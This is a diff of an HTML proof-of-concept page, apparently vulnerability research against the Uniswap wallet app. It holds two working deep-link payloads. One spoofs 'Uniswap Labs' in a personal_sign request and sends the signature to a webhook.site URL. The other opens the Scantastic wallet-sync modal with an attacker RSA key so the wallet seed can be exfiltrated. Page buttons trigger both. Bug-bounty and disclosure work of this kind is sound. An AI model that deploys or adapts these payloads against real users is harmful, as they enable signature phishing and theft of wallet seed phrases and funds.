@@ -16,24 +16,22 @@ a { color: #ff0073; }
 </style>
 </head>
 <body>
-<h1>Uniswap PoC Test</h1>
+<h1>Uniswap PoC Test v3</h1>
 
 <div class="test">
-<h2>Test 1: UwuLink Signature Exfil</h2>
-<p>Opens a signing request showing "Uniswap Labs" as the dapp. Safe to sign.</p>
+<h2>Test 1: UwuLink Signature Exfil (FIXED)</h2>
+<p>Opens a personal_sign request showing "Uniswap Labs". Safe to sign - benign message.</p>
 <button id="uwulink-btn">Open UwuLink</button>
-<p class="note">After signing, the signature is sent to an attacker webhook.</p>
+<p class="note">After signing, check <a href="https://webhook.site/aacef163-7e1b-4bda-ab11-d748c1ee4cbc">webhook receiver</a></p>
 </div>
 
 <div class="test">
 <h2>Test 2: Scantastic Seed Exfil</h2>
-<p>Opens the Scantastic wallet-sync modal with attacker RSA key. DO NOT click Continue unless using a throwaway wallet.</p>
+<p>Opens Scantastic modal with attacker RSA key. DO NOT click Continue unless throwaway wallet.</p>
 <button id="scantastic-btn">Open Scantastic</button>
-<p class="note">Just opening this and seeing the modal (or an error) is enough for the PoC.</p>
 </div>
 
-<!-- Store deep links as text content in hidden divs to avoid escaping issues -->
-<div class="hidden" id="uwulink-url">uniswap://uwulink?uwulink{"method":"personal_sign","value":"0x5369676e20696e20746f20556e6973776170204c61627320746f2076657269667920796f75722077616c6c65742e205468697320726571756573742077696c6c206e6f742074726967676572206120626c6f636b636861696e207472616e73616374696f6e206f7220636f737420616e792067617320666565732e","chainId":1,"dapp":{"name":"Uniswap Labs","url":"https://uniswap.org","icon":"https://app.uniswap.org/favicon.ico"},"webhook":"https://webhook.site/aacef163-7e1b-4bda-ab11-d748c1ee4cbc"}</div>
+<div class="hidden" id="uwulink-url">uniswap://uwulink?uwulink{"method": "personal_sign", "message": "0x5369676e20696e20746f20556e6973776170204c61627320746f2076657269667920796f75722077616c6c65742e", "chainId": 1, "dapp": {"name": "Uniswap Labs", "url": "https://uniswap.org", "icon": "https://app.uniswap.org/favicon.ico"}, "webhook": "https://webhook.site/aacef163-7e1b-4bda-ab11-d748c1ee4cbc"}</div>
 <div class="hidden" id="scantastic-url">uniswap://scantastic?pubKey=%7B%22alg%22%3A%22RSA-OAEP-256%22%2C%22kty%22%3A%22RSA%22%2C%22n%22%3A%22hywGfne3bod1zkyZtkuMtMPShf2C5vzf7nnYTfJ8brEG9pdBVQ0Ri7z3kJX-sWz_hYCeXyRvVtZpkAC6TqEuPqelyWlSiKRWXRqfhvZ4xFT_ndreY2MDN54CuENUGZZNDUQ8jPkOGF5RCB8zFNuwTIN1RFT3joy0opTZewzZFUCcG0_qxLSF6USPilZ6Ay5GiicdZjE9rwH7qBPCjFr900XW3YkcyRRqfSBw9rhH_eULJAraZqQag0Lx0OjdcKqsDw8jG9YhkukWpA5tQ8z4rDlaV_e-edlu_qaQpJ4lX-w6N43ZMoxVpaScI9d85PS1hLiKPkAYFEZ2dL2hF7ViYbPvooZD9LiPLUlmxScJNQXs-XGOUe-iuGX8G1ulorkcWp5NWJZWz3f24A8KYdaXswyx3aXLgOnpEWJ-XPizdRqWMuXZreTaSkj2ZTmxqUVYUUcDhOpJlH4OODVf2BBQLZT-XOqx6kwzeCZAtwxfU405OrMJ52_qc6Uj26DanBStr4o2Pv0ABurHEbM2bxGhcfYcFQdoHcIZ9BwBBsQuGzKgsvJ-p4KGXj6aprRF_oV8ZsHYv2rdLc1D4PrmHZi1qCIi7-BwV6IyPQAuc3JpZmGvHte-2hWIvDwiW2taVs4998G3HUvne-NoVmP0cEU0HjAaXWNZ33IrDw86Qm2bZhk%22%2C%22e%22%3A%22AQAB%22%7D&uuid=00000000-0000-0000-0000-000000000000&vendor=MacBook&model=Pro&browser=Chrome</div>
 
 <script>
@@ -41,12 +39,10 @@ document.getElementById('uwulink-btn').addEventListener('click', function() {
   var url = document.getElementById('uwulink-url').textContent.trim();
   window.location.href = url;
 });
-
 document.getElementById('scantastic-btn').addEventListener('click', function() {
   var url = document.getElementById('scantastic-url').textContent.trim();
   window.location.href = url;
 });
 </script>
-
 </body>
 </html>
